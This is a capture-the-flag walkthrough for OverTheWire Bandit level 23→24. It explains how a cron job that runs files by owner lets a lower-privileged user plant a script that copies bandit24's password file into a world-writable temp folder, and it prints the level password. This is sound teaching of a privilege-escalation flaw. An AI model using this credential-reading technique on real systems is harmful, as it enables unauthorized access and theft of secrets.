# OverTheWire: Bandit — Level 23 → Level 24
       
> Skills: cron jobs, bash scripting, for loops, file ownership, chmod  permissions                                     
> Difficulty: Medium                                                                 
> [Bandit Level 24](https://overthewire.org/wargames/bandit/bandit24.html)

## Login

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

Password: *obtain from previous level*

## Task

> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

## Theory

As before, cron jobs in `/etc/cron.d/` run a command as a specified user on a schedule, and five stars means "every minute, every day."

New concepts in this level: the cron job here loops over files in a folder and runs any script it finds — but only if that script is owned by a specific user. This means we can plant our own script in that folder, and if we own it correctly, the cron job will execute it for us.

| Command/Flag | Meaning |
|---|---|
| `for i in * .*; do ... done` | Loops over every file/folder in the current directory, including hidden ones (`.*`) |
| `stat --format "%U" ./$i` | Prints only the owner (username) of file `$i` |
| `timeout -s 9 60 ./$i` | Runs `$i`, but kills it with signal 9 (SIGKILL) if it's still running after 60 seconds |
| `mktemp -d` | Creates a new empty temporary directory with a random name and prints its path |
| `chmod +rx file` | Adds read and execute permission to a file for owner/group/others as applicable |
| `chmod 777 dir` | Gives everyone full read/write/execute permission on a directory |
| `chmod +rwx file` | Adds read, write, and execute permission to a file |

## Solution

### 1. List the cron jobs in /etc/cron.d/

```bash
bandit23@bandit:~$ ls -la /etc/cron.d
```

```
total 36
drwxr-xr-x  2 root root 4096 Jul 11  2020 .
drwxr-xr-x 87 root root 4096 May 14  2020 ..
-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit15_root
-rw-r--r--  1 root root   62 Jul 11  2020 cronjob_bandit17_root
-rw-r--r--  1 root root  120 May  7  2020 cronjob_bandit22
-rw-r--r--  1 root root  122 May  7  2020 cronjob_bandit23
-rw-r--r--  1 root root  120 May 14  2020 cronjob_bandit24
-rw-r--r--  1 root root   62 May 14  2020 cronjob_bandit25_root
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
```

> What to notice: `cronjob_bandit24` is the relevant file, since we're after bandit24's password.

### 2. Read the cron job configuration

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
```

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

> What to notice: this runs `/usr/bin/cronjob_bandit24.sh` as bandit24, every minute. As always, we need to read the script to see what it does.

### 3. Read the script being executed

```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
```

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

> What to notice: since this runs as bandit24, `myname` is "bandit24", so it operates on `/var/spool/bandit24`. It loops over every file there, skips `.` and `..`, checks the owner of each file with `stat`, and if the owner is bandit23, it executes that file (with a 60-second timeout) before deleting it. Since we're logged in as bandit23, any script we drop in `/var/spool/bandit24` and own as bandit23 will get executed as bandit24.

### 4. Create a working directory and write a payload script

```bash
bandit23@bandit:~$ mktemp -d
```

```
/tmp/tmp.ljEyl6kv1M
```

> What to notice: `mktemp -d` creates a fresh temp directory with a random, unpredictable name and prints its path — use whatever path you get, it will differ each time.

```bash
bandit23@bandit:~$ cd /tmp/tmp.ljEyl6kv1M
bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ nano bandit24_pass.sh
```

```
(no output — opens the nano text editor; type the script contents, then press CTRL+O to save and CTRL+X to exit)
```

> What to notice: the script written into `bandit24_pass.sh` is:
> ```bash
> #!/bin/bash
> cat /etc/bandit_pass/bandit24 > /tmp/tmp.ljEyl6kv1M/password
> ```
> This script will run as bandit24 (because the cron job executes it as bandit24), so it has permission to read `/etc/bandit_pass/bandit24`, and it writes that password into a file in our temp directory.

### 5. Set permissions so the script can run and the output file can be written

```bash
bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ chmod +rx bandit24_pass.sh
bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ chmod 777 /tmp/tmp.ljEyl6kv1M
bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ touch password
bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ chmod +rwx password
bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ ls -la
```

```
total 1120
drwxrwxrwx    2 bandit23 root        4096 Jun 17 16:32 .
drwxrws-wt 4795 root     root     1134592 Jun 17 16:33 ..
-rwxr-xr-x    1 bandit23 root          73 Jun 17 16:16 bandit24_pass.sh
-rwxrwxrwx    1 bandit23 bandit23       0 Jun 17 16:32 password
```

> What to notice: `chmod +rx` makes the script executable so `timeout ./bandit24_pass.sh` in the cron job can run it. `chmod 777` on the temp directory and `chmod +rwx` on the empty `password` file ensure that when the script runs as bandit24, it has permission to write into both the directory and the file — without this, bandit24 would get a permission denied error writing to files owned by bandit23.

### 6. Copy the script into bandit24's spool folder

```bash
bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ cp bandit24_pass.sh /var/spool/bandit24/bandit24_pass.sh
```

```
(no output — file copied successfully)
```

> What to notice: the file is now owned by bandit23 and sits in `/var/spool/bandit24`. Within a minute, the cron job will find it, confirm bandit23 owns it, and execute it as bandit24.

### 7. Wait for the cron job to run, then read the password

```bash
bandit23@bandit:/tmp/tmp.ljEyl6kv1M$ cat password
```

```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

> What to notice: if this file is still empty, wait another minute (the cron job only runs once per minute) and check that `bandit24_pass.sh` was actually executable and that the permissions from step 5 were set correctly before copying it over.

## Password for Next Level

```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

## Key Takeaways

A cron job that executes files based on ownership, without restricting where those files come from, lets any user who can write to the watched folder get code executed as the cron job's user. Setting permissive `chmod` modes on your scratch files and directories ahead of time avoids permission errors when a different user's process tries to use them.

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Forgetting `chmod +rx` on the payload script | The cron job finds the file but `timeout ./bandit24_pass.sh` fails silently because it isn't executable | Run `chmod +rx` on the script before copying it over |
| Leaving the temp directory or `password` file with restrictive permissions | bandit24 can't write the password file, so `password` stays empty | `chmod 777` the directory and `chmod +rwx` the output file before copying the script over |
| Copying the script into the wrong spool folder | The cron job never finds or runs the script, since it only scans `/var/spool/bandit24` | Always re-check the cron script's `cd /var/spool/$myname` line — the target folder can change between versions of this level |
| Checking the password file too quickly | The file is still empty because the cron job runs once per minute and hasn't fired yet | Wait at least 60 seconds before checking |
